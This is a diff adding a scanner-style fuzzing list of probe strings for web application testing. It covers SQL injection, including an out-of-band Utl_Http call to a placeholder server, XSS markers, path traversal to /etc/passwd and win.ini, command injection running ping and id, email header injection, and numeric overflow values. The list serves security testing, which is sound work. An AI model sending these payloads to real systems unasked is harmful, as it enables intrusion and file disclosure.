@@ -1,0 +1,116 @@
+{
+"fuzz_string":"'"
+,
+"fuzz_string":"'--"
+,
+"fuzz_string":"' or 1=1--"
+,
+"fuzz_string":"1 or 1=1--"
+,
+"fuzz_string":"' or 1 in (@@version)--"
+,
+"fuzz_string":"1 or 1 in (@@version)--"
+,
+"fuzz_string":"'; waitfor delay '0:30:0'--"
+,
+"fuzz_string":"1; waitfor delay '0:30:0'--"
+,
+"fuzz_string":"'||Utl_Http.request('http://<yourservername>') from dual--"
+,
+"fuzz_string":"1||Utl_Http.request('http://<yourservername>') from dual--"
+,
+"fuzz_string":"xsstest"
+,
+"fuzz_string":"xsstest%00%22<>'"
+,
+"fuzz_string":"</foo>"
+,
+"fuzz_string":"<foo></foo>"
+,
+"fuzz_string":"))))))))))"
+,
+"fuzz_string":"../../../../../../../../../../etc/passwd"
+,
+"fuzz_string":"../../../../../../../../../../boot.ini"
+,
+"fuzz_string":"..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\etc\\passwd"
+,
+"fuzz_string":"..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\boot.ini"
+,
+"fuzz_string":"../../../../../../../../../../windows/win.ini"
+,
+"fuzz_string":"..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\windows\\win.ini"
+,
+"fuzz_string":"|| ping -i 30 127.0.0.1 ; x || ping -n 30 127.0.0.1 &"
+,
+"fuzz_string":"| ping -i 30 127.0.0.1 |"
+,
+"fuzz_string":"| ping -n 30 127.0.0.1 |"
+,
+"fuzz_string":"& ping -i 30 127.0.0.1 &"
+,
+"fuzz_string":"& ping -n 30 127.0.0.1 &"
+,
+"fuzz_string":"; ping 127.0.0.1 ;"
+,
+"fuzz_string":"%0a ping -i 30 127.0.0.1 %0a"
+,
+"fuzz_string":"`ping 127.0.0.1`"
+,
+"fuzz_string":"| id"
+,
+"fuzz_string":"& id"
+,
+"fuzz_string":"; id"
+,
+"fuzz_string":"%0a id %0a"
+,
+"fuzz_string":"`id`"
+,
+"fuzz_string":";echo 111111"
+,
+"fuzz_string":"echo 111111"
+,
+"fuzz_string":"response.write 111111"
+,
+"fuzz_string":":response.write 111111"
+,
+"fuzz_string":"http://<yourservername>/"
+,
+"fuzz_string":"<youremail>%0aCc:<youremail>"
+,
+"fuzz_string":"<youremail>%0d%0aCc:<youremail>"
+,
+"fuzz_string":"<youremail>%0aBcc:<youremail>"
+,
+"fuzz_string":"<youremail>%0d%0aBcc:<youremail>"
+,
+"fuzz_string":"%0aDATA%0afoo%0a%2e%0aMAIL+FROM:+<youremail>%0aRCPT+TO:+<youremail>%0aDATA%0aFrom:+<youremail>%0aTo:+<youremail>%0aSubject:+tst%0afoo%0a%2e%0a"
+,
+"fuzz_string":"%0d%0aDATA%0d%0afoo%0d%0a%2e%0d%0aMAIL+FROM:+<youremail>%0d%0aRCPT+TO:+<youremail>%0d%0aDATA%0d%0aFrom:+<youremail>%0d%0aTo:+<youremail>%0d%0aSubject:+test%0d%0afoo%0d%0a%2e%0d%0a"
+,
+"fuzz_string":"1111111111111111111111111111111111111111111111"
+,
+"fuzz_string":"-1111111111111111111111111111111111111111111111"
+,
+"fuzz_string":"0.111111111111111111111111111111111111111111111"
+,
+"fuzz_string":"-0.11111111111111111111111111111111111111111111"
+,
+"fuzz_string":"1.11e11"
+,
+"fuzz_string":"-1.11e11"
+,
+"fuzz_string":"1.11e-11"
+,
+"fuzz_string":"-1.11-e11"
+,
+"fuzz_string":"1.1111111111111111111111111111e11111111111111111111111111111111111"
+,
+"fuzz_string":"1.111111111111111111111111111e-11111111111111111111111111111111111"
+,
+"fuzz_string":"-1.1111111111111111111111111111e11111111111111111111111111111111111"
+,
+"fuzz_string":"-1.111111111111111111111111111e-11111111111111111111111111111111111"
+,
+}
